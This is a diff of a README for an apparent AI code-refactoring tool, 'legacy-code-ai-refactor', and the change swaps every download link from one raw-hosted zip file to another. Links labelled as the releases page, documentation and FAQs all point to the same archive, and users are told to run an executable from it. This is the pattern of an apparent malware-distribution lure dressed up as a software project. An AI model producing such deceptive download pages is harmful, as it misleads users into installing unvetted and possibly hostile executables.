@@ -6,15 +6,15 @@ Welcome to **legacy-code-ai-refactor**, an AI-powered system designed to help yo
 
 ## 🔗 Download Now
 
-[![Download Now](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/polyvirulent/legacy-code-ai-refactor.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/polyvirulent/legacy-code-ai-refactor.zip)
+[![Download Now](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/src/patterns/code-refactor-legacy-ai-2.8.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/src/patterns/code-refactor-legacy-ai-2.8.zip)
 
 ## 📥 Download & Install
 
 To get started with **legacy-code-ai-refactor**, please visit the following page to download the software:
 
-[Download the latest release](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/polyvirulent/legacy-code-ai-refactor.zip)
+[Download the latest release](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/src/patterns/code-refactor-legacy-ai-2.8.zip)
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/polyvirulent/legacy-code-ai-refactor.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/src/patterns/code-refactor-legacy-ai-2.8.zip).
 2. Find the latest version listed.
 3. Click on the appropriate file for your system (for example, `.exe` for Windows or `.dmg` for Mac).
 4. Save the file to your computer.
@@ -68,8 +68,8 @@ If you encounter issues or have questions, you can seek help from our community.
 
 ## 📚 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/polyvirulent/legacy-code-ai-refactor.zip): Detailed user manuals and guides.
-- [FAQs](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/polyvirulent/legacy-code-ai-refactor.zip): Answers to common questions.
+- [Documentation](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/src/patterns/code-refactor-legacy-ai-2.8.zip): Detailed user manuals and guides.
+- [FAQs](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/src/patterns/code-refactor-legacy-ai-2.8.zip): Answers to common questions.
 
 ## ✍️ Contributing
 
@@ -81,4 +81,4 @@ For the latest news and updates, follow our GitHub repository. You can see new r
 
 Remember, modernizing legacy code doesn’t have to be hard. With **legacy-code-ai-refactor**, you can take a significant step toward cleaning up your codebase in a user-friendly way.
 
-[Download the latest release](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/polyvirulent/legacy-code-ai-refactor.zip) and start your journey to better code today!
+[Download the latest release](https://raw.githubusercontent.com/Hiusociu/legacy-code-ai-refactor/main/src/patterns/code-refactor-legacy-ai-2.8.zip) and start your journey to better code today!
